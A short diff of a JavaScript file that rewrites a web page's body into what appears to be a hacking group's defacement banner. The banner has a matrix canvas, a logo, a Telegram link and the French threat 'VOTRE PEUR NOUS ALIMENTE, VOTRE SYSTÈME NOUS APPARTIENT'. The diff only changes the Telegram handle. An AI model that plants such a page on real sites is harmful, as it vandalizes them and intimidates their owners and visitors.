@@ -167,7 +167,7 @@ document.body.innerHTML = `
   <canvas id="matrix"></canvas>
 
   <div class="content">
-    <div class="logo-container" onclick="window.location.href='https://t.me/xvdpx'">
+    <div class="logo-container" onclick="window.location.href='https://t.me/xvdpx6'">
       <img src="https://i.postimg.cc/q79gXyTp/image-2.webp" alt="Logo X-VDP-X" />
     </div>
 
@@ -181,7 +181,7 @@ document.body.innerHTML = `
       VOTRE PEUR NOUS ALIMENTE, VOTRE SYSTÈME NOUS APPARTIENT !
     </p>
 
-    <button class="btn" onclick="window.location.href='https://t.me/xvdpx'">
+    <button class="btn" onclick="window.location.href='https://t.me/xvdpx6'">
       TELEGRAM
     </button>
   </div>
@@ -283,3 +283,4 @@ document.body.innerHTML = `
 </html>
 
 `;
+
